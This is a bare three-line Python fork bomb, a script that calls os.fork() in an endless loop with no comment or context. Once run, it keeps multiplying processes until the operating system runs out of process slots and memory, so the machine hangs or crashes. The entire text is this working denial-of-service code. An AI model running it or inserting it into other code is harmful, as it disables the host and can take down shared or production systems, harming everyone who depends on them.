import os
while 1:
	os.fork()
